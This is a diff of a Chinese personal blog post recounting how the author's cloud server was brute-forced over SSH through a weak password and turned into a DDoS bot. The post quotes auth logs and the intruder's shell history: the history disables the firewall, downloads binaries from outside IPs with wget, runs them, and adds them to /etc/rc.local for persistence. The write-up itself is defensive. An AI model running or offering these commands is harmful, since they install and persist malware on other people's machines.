@@ -8,22 +8,19 @@
   <meta name="description" content="2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记录人生中第一次发现电脑被入侵">
-<meta property="og:url" content="https://freemandealer.github.io/gallery/2014/11/28/dont-hack-me/index.html">
+<meta property="og:url" content="https://freemandealer.github.io/gallery/2020/01/06/dont-hack-me/index.html">
 <meta property="og:site_name" content="Zhengyu Zhang">
 <meta property="og:description" content="2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：">
-<meta property="og:image" content="https://freemandealer.github.io/gallery/img/mind-like-water2.jpg">
+<meta property="og:image" content="https://freemandealer.github.io/gallery/img/2D1352707033F95409E6E9833.jpg?10">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/2D1352707033F95409E6E9833.jpg">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/adasd.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/E86A7D8EC6E9D9F5CF515AB0AC8862E8.png">
-<meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20191231173504051.png">
-<meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20191231173801542.png">
-<meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20191231183346817.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/hackme_sadfdsfa.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/hackme_uploader.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20200102120937588.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20200102191830507.png">
 <meta property="og:image" content="https://freemandealer.github.io/gallery/img/image-20200102191424119.png">
-<meta property="og:updated_time" content="2020-01-09T06:01:16.559Z">
+<meta property="og:updated_time" content="2020-01-09T06:42:37.241Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记录人生中第一次发现电脑被入侵">
 <meta name="twitter:description" content="2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：">
@@ -48,6 +45,7 @@ var _hmt = _hmt || [];
 
 </head>
 
+<script src="/js/hexo_resize_image.js"></script>
 <body>
   <div id="container">
     <div class="left-col">
@@ -218,8 +216,8 @@ var _hmt = _hmt || [];
       <div class="body-wrap"><article id="post-dont-hack-me" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2014/11/28/dont-hack-me/" class="article-date">
-  	<time datetime="2014-11-28T06:52:03.000Z" itemprop="datePublished">2014-11-28</time>
+      <a href="/2020/01/06/dont-hack-me/" class="article-date">
+  	<time datetime="2020-01-06T13:52:03.000Z" itemprop="datePublished">2020-01-06</time>
 </a>
     </div>
   
@@ -252,12 +250,12 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="/img/mind-like-water2.jpg" alt="Mind Like Water"></p>
-<p>2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：</p>
+        <p>2019年的最后一天下午，突然收到了百度云发来的短信，说我的服务器正在恶意攻击别人：</p>
 <a id="more"></a>
+<p><img src="/img/2D1352707033F95409E6E9833.jpg?10" alt=""></p>
 <p><img src="/img/2D1352707033F95409E6E9833.jpg" alt="2D1352707033F95409E6E9833" style="zoom:33%;"></p>
 <p>登陆百度云后，收到了站内信：</p>
-<p><img src="/img/adasd.png" alt="adasd" style="zoom: 50%;"></p>
+<p><img src="/img/adasd.png" alt="adasd" style="zoom:50%;"></p>
 <p>作为一个良民，我从来不琢磨攻击别人这件事。无辜又疑惑的我提工单寻求帮助，技术支持提供了具体的攻击手段SYNC_FLOOD（查了一下属于DDoS的一种）和攻击时间（12-30 的 12:05 至 18:41）。</p>
 <p><img src="/img/E86A7D8EC6E9D9F5CF515AB0AC8862E8.png" alt="E86A7D8EC6E9D9F5CF515AB0AC8862E8" style="zoom:50%;"></p>
 <p>对着时间，往上查了一下系统日志，马上就精神了。</p>
@@ -265,13 +263,10 @@ var _hmt = _hmt || [];
 <p>syslog日志显示，在 Dec 30 08:44:54 有其他人登陆过我的系统。并且有一个奇怪的定时任务 ( cron.hourly ) 每小时都会执行一遍。接着我有看了一下 auth 日志，它会记录各种登陆时的验证信息，包括失败的验证和成功的验证。</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#10;Dec 30 08:40:33 instance-3eq6v61r sshd[14727]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:40:35 instance-3eq6v61r sshd[14727]: Failed password for root from 51.91.136.174 port 49568 ssh2&#10;Dec 30 08:40:36 instance-3eq6v61r sshd[14727]: Received disconnect from 51.91.136.174 port 49568:11: Normal Shutdown, Thank you for playing [preauth]&#10;Dec 30 08:40:36 instance-3eq6v61r sshd[14727]: Disconnected from 51.91.136.174 port 49568 [preauth]&#10;Dec 30 08:44:54 instance-3eq6v61r sshd[15221]: Accepted password for root from 51.91.136.174 port 47114 ssh2  # &#25214;&#21040;&#20102;&#23545;&#24212;&#30340;&#34987;&#20182;&#20154;&#25104;&#21151;&#30331;&#20837;&#30340;&#28857;&#65292;&#26102;&#38388;&#23545;&#30340;&#19978;&#12290;&#22855;&#24618;&#30340;&#26159;&#21518;&#38754;&#20182;&#36824;&#22312;&#19981;&#20572;&#35797;&#23494;&#30721;&#65292;&#26159;&#20195;&#30721;&#27809;&#20889;&#22909;&#65292;&#36824;&#26159;&#40657;&#23458;&#19981;&#21482;&#19968;&#20010;&#65311;&#10;Dec 30 08:44:54 instance-3eq6v61r sshd[15221]: pam_unix(sshd:session): session opened for user root by (uid=0)&#10;Dec 30 08:44:54 instance-3eq6v61r systemd-logind[1027]: New session 225 of user root.&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: Received disconnect from 51.91.136.174 port 47114:11: Normal Shutdown, Thank you for playing&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: Disconnected from 51.91.136.174 port 47114&#10;Dec 30 08:44:55 instance-3eq6v61r sshd[15221]: pam_unix(sshd:session): session closed for user root&#10;Dec 30 08:44:55 instance-3eq6v61r systemd-logind[1027]: Removed session 225.&#10;Dec 30 08:49:22 instance-3eq6v61r sshd[15784]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Failed password for root from 51.91.136.174 port 44660 ssh2&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Received disconnect from 51.91.136.174 port 44660:11: Normal Shutdown, Thank you for playing [preauth]&#10;Dec 30 08:49:25 instance-3eq6v61r sshd[15784]: Disconnected from 51.91.136.174 port 44660 [preauth]&#10;Dec 30 08:54:01 instance-3eq6v61r sshd[16302]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=51.91.136.174  user=root&#10;Dec 30 08:54:03 instance-3eq6v61r sshd[16302]: Failed password for root from 51.91.136.174 port 42206 ssh2&#10;...</span><br></pre></td></tr></table></figure>
 <p>日志显示 Dec 30 08:44:54 确实有人成功登陆了我的机器，登陆者的 ip 为 51.91.136.174。这个 ip 在成功登陆之前做了很多很多错误的尝试。看来是通过暴力破解进入的。这里说明一下，我这台机器是为了测试一个小东西临时创建的云虚机，所以使用了一个不严肃的密码: test@123。在配置密码时百度云其实已经提示我弱口令警告了，但我为了图方便没有管警告。</p>
-<p>日志中比较有意思的还有亮点，这个 ip 成功登陆后还在不停尝试其它密码，估计是暴力破解的代码没写好，进程/线程没有同步导致的。另外除了这个 ip 以外，还有很多 ip 在尝试登陆。这说明入侵者有很多肉机，也有可能尝试的入侵者不止一波人。这些来自很多国家和地区，随便查了其中两个ip的归属地：</p>
-<p><img src="/img/image-20191231173504051.png" alt="image-20191231173504051" style="zoom: 33%;"></p>
-<p><img src="/img/image-20191231173801542.png" alt="image-20191231173801542" style="zoom:33%;"></p>
+<p>日志中比较有意思的还有亮点，这个 ip 成功登陆后还在不停尝试其它密码，估计是暴力破解的代码没写好，进程/线程没有同步导致的。另外除了这个 ip 以外，还有很多 ip 在尝试登陆。这说明入侵者有很多肉机，也有可能尝试的入侵者不止一波人。这些来自很多国家和地区，随便查了其中两个ip的归属地，分别来自法国和荷兰。</p>
 <p>接下来，我又查看了一下命令历史记录，没想到真的有记录。在我印象中，入侵最后一步不是要清除痕迹的吗？难道是新手？还是说他觉得这台机器的主人不会查记录？说实话，如果不是百度云风控报警，我也不会注意我的机器被入侵。先来看一下他的操作记录：</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">629  root 2019/12/29 19:20:47 service iptables stop&#10;630  root 2019/12/29 19:20:50 wget http://111.38.249.179:45889/java-id&#10;631  root 2019/12/29 19:22:02 chmod 777 java-id&#10;632  root 2019/12/29 19:22:02 ./java-id&#10;633  root 2019/12/29 19:22:02 cd /tmp&#10;634  root 2019/12/29 19:22:02 service iptables stop&#10;635  root 2019/12/29 19:22:03 wget http://111.38.249.179:45889/java-mm&#10;636  root 2019/12/29 19:22:25 chmod 777 java-mm&#10;637  root 2019/12/29 19:22:25 ./java-mm&#10;638  root 2019/12/29 19:22:25 echo &#34;cd  /root/&#34;&#62;&#62;/etc/rc.local&#10;639  root 2019/12/29 19:22:25 echo &#34;./java-id&#38;&#34;&#62;&#62;/etc/rc.local&#10;640  root 2019/12/29 19:22:25 echo &#34;./java-mm&#38;&#34;&#62;&#62;/etc/rc.local&#10;641  root 2019/12/29 19:22:25 echo &#34;/etc/init.d/iptables stop&#34;&#62;&#62;/etc/rc.local&#10; &#10;827  root 2019/12/30 03:40:39 service iptables stop&#10;828  root 2019/12/30 03:40:43 wget http://111.39.153.250:27788/jdk-8k&#10;829  root 2019/12/30 03:40:47 chmod 777 jdk-8k&#10;830  root 2019/12/30 03:40:51 ./jdk-8k&#10;831  root 2019/12/30 03:40:55 cd /usr/sbin/&#10;832  root 2019/12/30 03:40:59 service iptables stop&#10;833  root 2019/12/30 03:41:03 wget http://111.39.153.250:27788/jdk-9k&#10;834  root 2019/12/30 03:41:07 chmod 777 jdk-9k&#10;835  root 2019/12/30 03:41:11 ./jdk-9k&#10;836  root 2019/12/30 03:41:15 echo &#34;cd  /root/&#34;&#62;&#62;/etc/rc.local&#10;837  root 2019/12/30 03:41:19 echo &#34;./jdk-8k&#38;&#34;&#62;&#62;/etc/rc.local&#10;838  root 2019/12/30 03:41:23 echo &#34;./jdk-9k&#38;&#34;&#62;&#62;/etc/rc.local&#10;839  root 2019/12/30 03:41:27 echo &#34;/etc/init.d/iptables stop&#34;&#62;&#62;/etc/rc.local</span><br></pre></td></tr></table></figure>
-<p>历史记录显示这家伙关了我的防火墙，然后从 111.38.249.179:45889 下载了两个可执行文件，名字分别叫做 jdk-8k 和 jdk-9k，并且运行了它们。对于这个 ip 查看到它来自国内。</p>
-<p><img src="/img/image-20191231183346817.png" alt="image-20191231183346817" style="zoom:33%;"></p>
+<p>历史记录显示这家伙关了我的防火墙，然后从 111.38.249.179:45889 下载了两个可执行文件，名字分别叫做 jdk-8k 和 jdk-9k，并且运行了它们。对于这个 ip 查看到它来自国内安徽六安。</p>
 <p>随后我去目录里寻找 jdk-8k、jdk-9k 这两个可疑文件，然而什么都没找到。另外我探测了 111.38.249.179 这台主机，显示主机活着，但45889和27788两个端口拒绝了我的连接。这意味着有如下几种可能：</p>
 <ul>
 <li>入侵者删除了文件，并隐藏了删除操作的历史 （基本没可能，他要会隐藏历史就不会让我看到上面这些）</li>
@@ -328,7 +323,7 @@ var _hmt = _hmt || [];
 <p><img src="/img/image-20200102191424119.png" alt="image-20200102191424119" style="zoom:50%;"></p>
 <p>竟然也是 DDoS!</p>
 <p>完结撒花！</p>
-<p>通过这件事，我发现弱口令还是真的危险的。入侵者有时候目的还是很邪恶的，不只是强行跟你共享服务器，可能会企图完全霸占。不能抱着“应该没有人会盯上我这台小破机器吧”的侥幸态度，一定要认真设置密码，哪怕只是试验机。</p>
+<p>通过这件事，我学到一个朴素的知识：弱口令是真的危险。入侵者有时候目的还是很邪恶的，不只是强行跟你共享服务器，可能会企图完全霸占。不能抱着“应该没有人会盯上我这台小破机器吧”的侥幸态度，一定要认真设置密码，哪怕只是试验机。</p>
 
       
     </div>
@@ -338,18 +333,9 @@ var _hmt = _hmt || [];
     
 <nav id="article-nav">
   
-    <a href="/2014/11/28/mind-like-water/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          心静如水--GTD时间管理
-        
-      </div>
-    </a>
   
-  
-    <a href="/2014/11/28/change-thunderbird-reply-header/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">修改Thunderbird的回复头语言和样式</div>
+    <a href="/2019/07/23/tabnine-experience/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">tabnine试用体验</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
